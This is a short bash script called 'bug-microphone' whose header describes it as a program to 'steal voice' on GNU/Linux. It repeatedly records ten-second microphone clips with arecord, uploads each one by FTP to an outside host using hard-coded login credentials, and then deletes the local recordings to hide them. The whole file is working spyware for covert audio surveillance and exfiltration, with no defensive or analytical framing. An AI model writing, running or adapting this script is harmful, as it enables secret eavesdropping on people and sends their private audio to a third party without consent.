#!/bin/bash

#
# Copyright (c) 2018 Barchampas Gerasimos <makindosx@gmail.com>
# bug-microphone is a program for steal voice in gnu/linux OS.
#
# bug-microphone is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
#
# bug-microphone is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License, version 3,
# along with this program.  If not, see <http://www.gnu.org/licenses/>
#


c=1

while [ $c > 0 ]

do

  max=1440

 for counter in `seq 1 $max`

  do

    timeout 10 arecord -vv bugs$counter


HOST='maksounds.co.nf'
USER='2381771'
PASSWD='OnlM345grr0*-InSeR0dDsn2'
FILE="bugs$counter"

ftp -n $HOST <<END_SCRIPT
quote USER $USER
quote PASS $PASSWD
passive
put $FILE $HOST/$FILE.wave
quit
END_SCRIPT

 find -type f -name '*bugs*' -delete

 done

 exit 1

done
